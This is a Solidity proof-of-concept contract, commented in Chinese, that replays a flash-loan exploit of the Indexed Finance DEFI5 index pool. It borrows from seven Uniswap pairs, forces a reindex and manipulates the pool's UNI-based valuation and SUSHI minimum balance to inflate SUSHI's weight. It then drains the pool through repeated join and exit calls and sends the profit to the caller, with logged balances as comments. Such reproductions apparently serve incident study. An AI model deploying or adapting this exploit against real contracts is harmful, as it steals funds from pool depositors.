//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "hardhat/console.sol";

import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@indexed-finance/indexed-core/contracts/interfaces/IIndexPool.sol';

interface IMarketCapSqrtController {
    struct IndexPoolMeta {
        bool initialized;
        uint16 categoryID;
        uint8 indexSize;
        uint8 reweighIndex;
        uint64 lastReweigh;
    }

    function reindexPool(address poolAddress) external;
    function updateMinimumBalance(IIndexPool pool, address tokenAddress) external;

    function getPoolMeta(address poolAddress) external view returns (IndexPoolMeta memory);
}


contract Attack is IUniswapV2Callee{
    
    IIndexPool constant DEFI5 = IIndexPool(0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41);
    IMarketCapSqrtController constant controller = IMarketCapSqrtController(0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb);

    IUniswapV2Pair constant UNI_ETH = IUniswapV2Pair(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
    IUniswapV2Pair constant AAVE_ETH = IUniswapV2Pair(0xD75EA151a61d06868E31F8988D28DFE5E9df57B4);
    IUniswapV2Pair constant COMP_ETH = IUniswapV2Pair(0x31503dcb60119A812feE820bb7042752019F2355);
    IUniswapV2Pair constant ETH_CRV = IUniswapV2Pair(0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009);
    IUniswapV2Pair constant MKR_ETH = IUniswapV2Pair(0xBa13afEcda9beB75De5c56BbAF696b880a5A50dD);
    IUniswapV2Pair constant SNX_ETH = IUniswapV2Pair(0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470);
    IUniswapV2Pair constant SUSHI_ETH = IUniswapV2Pair(0x795065dCc9f64b5614C407a6EFDC400DA6221FB0);

    IERC20 constant UNI   = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 constant AAVE  = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 constant SUSHI = IERC20(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2);
    IERC20 constant COMP  = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    IERC20 constant CRV   = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 constant MKR   = IERC20(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2);
    IERC20 constant SNX   = IERC20(0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F);

    IUniswapV2Router02 constant router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function attack() external{
        // attack.
        this.uniswapV2Call(address(0), 0, 0, abi.encode(uint(1)));
    }

    function swapUNI(IERC20 token, string memory name) internal{
        uint defi5;
        uint balance = token.balanceOf(address(this));
        console.log("Swap %s start", name);
        token.approve(address(DEFI5), balance);
        while (true){
            defi5 = DEFI5.getBalance(address(token));
            console.log("DEFI5's %s=%s", name, defi5);
            balance = token.balanceOf(address(this));
            console.log("My %s=%s, UNI=%s ", name, balance, UNI.balanceOf(address(this)));

            if(balance == 0) break;

            uint value = defi5/2;
            if (balance < defi5/2) value = balance;
            DEFI5.swapExactAmountIn(address(token), value, address(UNI), 0, 10**50);
        }
        console.log("Swap %s end", name);
    }

    function join(IERC20 token) internal{
        uint defi5;
        uint me = token.balanceOf(address(this));
        string memory name = token.name();
        token.approve(address(DEFI5), me);
        while (true){
            defi5 = DEFI5.getBalance(address(token));
            console.log("DEFI5's %s=%s",name, defi5);
            me = token.balanceOf(address(this));
            console.log("My %s=%s",name, me);

            if(me == 0) break;

            uint value = defi5/2;
            if (me < defi5/2) value = me;
            DEFI5.joinswapExternAmountIn(address(token), value, 0);
        }
    }

    function logMyAssets() internal view{
        console.log("My assets:");
        // 为了看着方便，略去低位的数字
        console.log("UNI:  ", UNI.balanceOf(address(this))/(10**20));
        console.log("AAVE: ", AAVE.balanceOf(address(this))/(10**20));
        console.log("COMP: ", COMP.balanceOf(address(this))/(10**20));
        console.log("MKR:  ", MKR.balanceOf(address(this))/(10**20));
        console.log("SNX:  ", SNX.balanceOf(address(this))/(10**20));
        console.log("CRV:  ", CRV.balanceOf(address(this))/(10**20));
        console.log("SUSHI:", SUSHI.balanceOf(address(this))/(10**20));
    }

    function logDEFI5Assets() internal view{
        console.log("DEFI5's assets:");
        address[] memory tokens = DEFI5.getCurrentTokens();
        uint length = tokens.length;
        for(uint8 i = 0; i<length; i++){
            address addr = tokens[i];
            string memory name;
            if (addr == address(MKR)) name = "MKR";
            else name = IERC20(addr).name();
            console.log("%s: balance: %s  denorm:%s", name, 
                DEFI5.getBalance(addr)/(10**20),
                DEFI5.getTokenRecord(addr).denorm/(10**18)
            );

            // IIndexPool.Record memory record = DEFI5.getTokenRecord(addr);
            // console.log("%s: balance: %s", name, DEFI5.getBalance(addr));
            // console.log("  bound:%s, ready:%s", record.bound, record.ready);
            // console.log("  denorm:%s, desiredDenorm:%s", record.denorm, record.desiredDenorm);
        }
    }


    uint uni_value;
    uint aave_value;
    uint comp_value;
    uint mkr_value;
    uint snx_value;
    uint crv_value;
    uint sushi_value;


    function uniswapV2Call(address, uint, uint, bytes calldata data) external override{

        uint step = abi.decode(data, (uint));
        console.log("Step %d start", step);

        uint borrow_value;
        if (step == 1){
            (uint112 reserve0, , ) = UNI_ETH.getReserves();
            borrow_value = reserve0 * 9 / 10;
            uni_value = borrow_value * 1031 / 1000;
            UNI_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));
        } else if (step == 2){
            (uint112 reserve0, , ) = AAVE_ETH.getReserves();
            borrow_value = reserve0 * 9 / 10;
            aave_value = borrow_value * 1031 / 1000;
            AAVE_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));
        } else if (step == 3){
            (uint112 reserve0, , ) = COMP_ETH.getReserves(); 
            borrow_value = reserve0 * 9 / 10;    
            comp_value = borrow_value * 1031 / 1000;       
            COMP_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));

        } else if (step == 4){
            (uint112 reserve0, , ) = MKR_ETH.getReserves();
            borrow_value = reserve0 * 9 / 10;
            mkr_value = borrow_value * 1031 / 1000;        
            MKR_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));
        } else if (step == 5){
            (uint112 reserve0, , ) = SNX_ETH.getReserves();
            borrow_value = reserve0 * 9 / 10;
            snx_value = borrow_value * 1031 / 1000;
            SNX_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));
        } else if (step == 6){
            // 这个交易对是反的
            (, uint112 reserve1, ) = ETH_CRV.getReserves();
            borrow_value = reserve1 * 9 / 10;
            crv_value = borrow_value * 1031 / 1000;
            ETH_CRV.swap(0, borrow_value, address(this), abi.encode(step + 1));
        } else if (step == 7){
            borrow_value = 22*10**22;
            sushi_value = borrow_value * 1031 / 1000;
            SUSHI_ETH.swap(borrow_value, 0, address(this), abi.encode(step + 1));
            
        } else {
            console.log("Assets to pay back:");
            console.log("UNI:  ", uni_value);
            console.log("AAVE: ", aave_value);
            console.log("COMP: ", comp_value);
            console.log("MKR:  ", mkr_value);
            console.log("SNX:  ", snx_value);
            console.log("CRV:  ", crv_value);
            console.log("SUSHI:", sushi_value);
            
            // 需要还给闪电贷的资产，借款 + 3.1% 利息。
            // UNI:   1893268653704813119979700
            // AAVE:  228075105151744240691866
            // COMP:  42653654878881489975732
            // MKR:   5954878688205541156656
            // SNX:   467708296526547391775481
            // CRV:   3310445005642820074514093
            // SUSHI: 226820000000000000000000

            logMyAssets();
            // 目前借到的资产（除以 10**20后）
            // UNI:   18363
            // AAVE:  2212
            // COMP:  413
            // MKR:   57
            // SNX:   4536
            // CRV:   32109
            // SUSHI: 2200

            logDEFI5Assets();
            // 目前池中的资产及权重
            // Uniswap: balance: 2033  denorm:9
            // Aave Token: balance: 75  denorm:4
            // Compound: balance: 57  denorm:3
            // Synthetix Network Token: balance: 193  denorm:0
            // Curve DAO Token: balance: 7417  denorm:4
            // MKR: balance: 6  denorm:3

            console.log("Block:%s Time:%s", block.number, block.timestamp);
            // Block:13417950 Time:1634236645
            // 时间间隔上一个块要超过 7 天。
            // hardhat 可通过 await hre.network.provider.send("evm_increaseTime", [3600*24*7 + 3600]) 设置

            IMarketCapSqrtController.IndexPoolMeta memory meta = controller.getPoolMeta(address(DEFI5));
            console.log("DEFI5 lastReweigh=%s, reweighIndex=%s", meta.lastReweigh, meta.reweighIndex);
            // DEFI5 lastReweigh=1633607810, reweighIndex=23
            // 每3次 reweight 可进行一次 reIndex
            // 这个块刚好可以进行一次 reIndex

            // 进行 reindexPool 操作
            controller.reindexPool(address(DEFI5));
            console.log("After Reindex");
            logDEFI5Assets();
            // reindex 之后， SUSHI 被加入池中，初始权重为 0
            // Uniswap: balance: 2033  denorm:9
            // Aave Token: balance: 75  denorm:4
            // Compound: balance: 57  denorm:3
            // Synthetix Network Token: balance: 193  denorm:0
            // Curve DAO Token: balance: 7417  denorm:4
            // MKR: balance: 6  denorm:3
            // SushiToken: balance: 0  denorm:0

            (address token, uint256 value) = DEFI5.extrapolatePoolValueFromToken();
            console.log("DEFI5.extrapolatePoolValueFromToken()=%s, %s", token, value/(10**20));
            // 以 UNI 估计池中资产，约为 5206 * 10**20
            // DEFI5.extrapolatePoolValueFromToken()=0x1f9840a85d5af5bf1d1762f925bdaddc4201f984, 5206

            // 将借来的所有资产通过 DEFI5.swapExactAmountIn
            // 换成 UNI 取出。此时 DEFI5 池里 UNI 资产大量减少，其他5个资产大量增多。
            swapUNI(AAVE, "AAVE");
            swapUNI(COMP, "COMP");
            swapUNI(SNX, "SNX");
            swapUNI(CRV, "CRV");
            swapUNI(MKR, "MKR");  // MKR 的 ERC20 里没有实现 MKR.name()，所以这里直接传递名称过去。

            console.log("After swap UNI");
            (token, value) = DEFI5.extrapolatePoolValueFromToken();
            console.log("DEFI5.extrapolatePoolValueFromToken()=%s, %s", token, value/(10**20));
            // DEFI5.extrapolatePoolValueFromToken()=0x1f9840a85d5af5bf1d1762f925bdaddc4201f984, 123
            // 可以看到，仍以 UNI 估计池中资产，则会错误的估算，只剩不到 1/40
            // 其实池中总资产并没有明显变化，只是已经被换成了 UNI 外的其他代币。

            logDEFI5Assets();
            // Uniswap: balance: 47  denorm:9
            // Aave Token: balance: 2287  denorm:4
            // Compound: balance: 470  denorm:3
            // Synthetix Network Token: balance: 4729  denorm:0
            // Curve DAO Token: balance: 39526  denorm:4
            // MKR: balance: 64  denorm:3
            // SushiToken: balance: 0  denorm:0

            // 更新 SUSHI 的 MinimumBalance
            // 以 1/100 总资产作为 MinimumBalance
            // 这里也会错误的设置
            controller.updateMinimumBalance(DEFI5, address(SUSHI)); 

            // 将所有的 UNI(包括借来的和 DEFI5 中换出来的) 重新投入池中。
            join(UNI);
            console.log("After join UNI");
            logDEFI5Assets();
            // 把 UNI 资产流入回池中。
            // Uniswap: balance: 20396  denorm:9
            // 其他不变

            // 流入 SUSHI，注意这种注入方式无法获取 DEFI5 代币。
            SUSHI.transfer(address(DEFI5), 22*10**22);
            DEFI5.gulp(address(SUSHI));
            console.log("After gulp SUSHI");
            logDEFI5Assets();
            // 由于之前 SUSHI 的 MinimumBalance 被设置的很小，流入后导致其权重很大。
            // 远超过其他几种币。但以实际价值来说，权重最大的应该还是 UNI 才对。
            // Uniswap: balance: 20396  denorm:9
            // Aave Token: balance: 2287  denorm:4
            // Compound: balance: 470  denorm:3
            // Synthetix Network Token: balance: 4729  denorm:0
            // Curve DAO Token: balance: 39526  denorm:4
            // MKR: balance: 64  denorm:3
            // SushiToken: balance: 2200  denorm:184

            // 取出池中所有资产。
            uint my_defi5 = IERC20(address(DEFI5)).balanceOf(address(this));
            DEFI5.exitPool(my_defi5, new uint256[](7));

            // 将取出的 SUSHI 也流入池中，获取 DEFI5
            join(SUSHI);

            // 燃烧 DEFI5， 取出池中所有资产。
            my_defi5 = IERC20(address(DEFI5)).balanceOf(address(this));
            DEFI5.exitPool(my_defi5, new uint256[](7));

            // 再重复一次。
            join(SUSHI);

            my_defi5 = IERC20(address(DEFI5)).balanceOf(address(this));
            DEFI5.exitPool(my_defi5, new uint256[](7));

            console.log("After pouring all out");
            logDEFI5Assets();
            // Uniswap: balance: 52  denorm:9
            // Aave Token: balance: 5  denorm:4
            // Compound: balance: 1  denorm:3
            // Synthetix Network Token: balance: 12  denorm:0
            // Curve DAO Token: balance: 102  denorm:4
            // MKR: balance: 0  denorm:3
            // SushiToken: balance: 399  denorm:184

            // 此时已经将 DEFI5 中的大量资产转移到了自身。
            logMyAssets();
            // UNI:   20343
            // AAVE:  2281
            // COMP:  469
            // MKR:   63
            // SNX:   4717
            // CRV:   39424
            // SUSHI: 1800

            // 还闪电贷
            UNI.transfer(address(UNI_ETH), uni_value);
            AAVE.transfer(address(AAVE_ETH), aave_value);
            CRV.transfer(address(ETH_CRV), crv_value);
            MKR.transfer(address(MKR_ETH), mkr_value);
            COMP.transfer(address(COMP_ETH), comp_value);
            SNX.transfer(address(SNX_ETH), snx_value);

            // SUSHI 余额不够偿还闪电贷，于是用 MKR 来还。
            sushi_value -= SUSHI.balanceOf(address(this));
            SUSHI.transfer(address(SUSHI_ETH),  SUSHI.balanceOf(address(this)));

            MKR.approve(address(router), MKR.balanceOf(address(this)));

            address[] memory path = new address[](3);
            path[0] = address(MKR);
            path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
            path[2] = address(SUSHI);

            router.swapTokensForExactTokens(
                sushi_value, 
                MKR.balanceOf(address(this)), 
                path, 
                address(SUSHI_ETH), 
                block.timestamp);

            // 还款完成，最终还剩下
            console.log("Finally");
            logMyAssets();
            // 这次是精确的资产值
            // UNI:   141124711333140917217728
            // AAVE:  54849388305047006119
            // COMP:  4305279317847635426433
            // MKR:   81230373442923741588
            // SNX:   4023931960842972760051
            // CRV:   632027127075580035599222
            // SUSHI: 0

            // 转账给攻击者地址。
            UNI.transfer(msg.sender, UNI.balanceOf(address(this)));
            AAVE.transfer(msg.sender, AAVE.balanceOf(address(this)));
            CRV.transfer(msg.sender, CRV.balanceOf(address(this)));
            MKR.transfer(msg.sender, MKR.balanceOf(address(this)));
            COMP.transfer(msg.sender, COMP.balanceOf(address(this)));
            SNX.transfer(msg.sender, SNX.balanceOf(address(this)));

        }
        console.log("Step %s end.", step);
    }

}